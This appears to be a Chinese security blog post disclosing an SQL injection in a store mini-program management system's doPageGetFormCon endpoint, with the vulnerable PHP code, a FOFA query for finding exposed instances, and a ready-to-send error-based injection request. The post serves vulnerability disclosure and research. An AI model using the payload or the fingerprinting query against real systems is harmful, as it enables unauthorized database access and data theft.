---
title: "万能门店小程序管理系统 /api/wxapps/doPageGetFormCon SQL 注入漏洞"
source: https://mrxn.net/jswz/api-wxapps-doPageGetFormCon-sqli.html
asset_dir: assets/万能门店小程序管理系统-apiwxappsdopagegetformcon-sql-注入漏洞
---

# 万能门店小程序管理系统 /api/wxapps/doPageGetFormCon SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/14 18:09
* 787浏览
* [0评论](#comment)
* 31分钟阅读

深入探索

安全运维咨询

SQL注入防护

技术文章订阅


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。是一个集成了会员管理和会员营销两大核心功能的综合性平台。它支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。该系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统 /api/wxapps/doPageGetFormCon 存在 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过该漏洞获取数据库中的敏感信息，甚至可能进一步控制服务器。

SQL注入防护

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

深入探索

Windows安全工具

网络安全培训

网络安全课程

application/api/controller/Wxapps.php

```
public function doPageGetFormCon()
    {
        $uniacid = input('uniacid');
        $id = intval(input('id'));
        $prefix = config('database.prefix');
        $item = Db::query("SELECT a.*,b.formname as title FROM {$prefix}wd_xcx_formcon as a LEFT JOIN {$prefix}wd_xcx_formlist as b on a.fid = b.id WHERE a.id = {$id} and a.uniacid={$uniacid}");
        if ($item) {
            $item = $item[0];
            $title = Db::query("SELECT * FROM {$prefix}wd_xcx_products WHERE id = {$item['cid']} and uniacid = {$uniacid}");
            if ($title) {
                $title = $title[0];
                $item['title'] = $title['title'];
                $item['formtitle'] = Db::name('wd_xcx_formlist')->where("uniacid", $uniacid)->where("id", $title['formset'])->value("formname");
                $item['formtitle'] = "文章-" . $title['title'] . "-" . $item['formtitle'];
            } else {
                $item['formtitle'] = Db::name('wd_xcx_formlist')->where("uniacid", $uniacid)->where("id", $item['fid'])->value("formname");
                $item['formtitle'] = "DIY-" . $item['formtitle'];
            }
            $itemval = unserialize($item['val']);
            foreach ($itemval as $key => &$res) {
                if (isset($res['z_val']) && $res['z_val']) {
                    foreach ($res['z_val'] as $k => &$rek) {
                        $rek = remote($uniacid, $rek, 1);
                    }
                }
            }
            $item['val'] = $itemval;
            $item['creattime'] = date("Y-m-d H:i:s", $item['creattime']);
            if ($item['vtime']) {
                $item['vtime'] = date("Y-m-d H:i:s", $item['vtime']);
            }
        }
        $result['data'] = $item;
        return json_encode($result);
    }
```

深入探索

文件大小转换

VPN服务

文本剥离工具

$id虽然也是拼接进SQL语句，但是有 intval() 强制转换。  
在 PHP 中，`intval()` 函数用于将变量的值转换为整数类型（integer）。它会解析字符串、浮点数或其他数据类型并返回其整数值。

代码安全审计

**intval() 函数主要特点：**

1. **数据类型转换**：将传入的值转换为整数类型。
2. **字符串解析**：会根据字符串的内容提取整数部分。例如，`intval("123abc")` 会返回 `123`。
3. **支持进制转换**：可以通过第二个参数指定进制（如二进制、八进制、十六进制等）。

**语法：**

```
intval(mixed $value, int $base = 10): int
```

* `$value`：需要转换的值。
* `$base`：可选，表示进制，默认为 10（十进制）。

**示例：**

```
echo intval("123");         // 输出: 123
echo intval("123abc");      // 输出: 123
echo intval("abc123");      // 输出: 0
echo intval(12.34);         // 输出: 12
echo intval("0b1010", 2);   // 输出: 10（二进制转换为十进制）
```

**注意：**

* 如果无法转换为整数（如纯字母字符串），则返回 `0`。
* 对于布尔值，`true` 转换为 `1`，`false` 转换为 `0`。

`intval()` 是一个常用的函数，适合在需要确保变量为整数时使用。

漏洞扫描服务

而$uniacid 无任何处理或过滤就直接拼接进SQL语句中，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /api/wxapps/doPageGetFormCon HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

id=1&uniacid=1+AND GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)%23
```

[![万能门店小程序管理系统 /api/wxapps/doPageGetFormCon SQL 注入漏洞](images/img-001-4e1df5cebdfa.webp)](https://image.mrxn.net/cb88d658601d4a94963556dec031e548.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万能门店小程序管理系统 /api/wxapps/doPageGetFormCon SQL 注入漏洞](https://mrxn.net/jswz/api-wxapps-doPageGetFormCon-sqli.html)  
文章链接：<https://mrxn.net/jswz/api-wxapps-doPageGetFormCon-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

编程

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-doPageGetFormCon-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

SQL注入防护

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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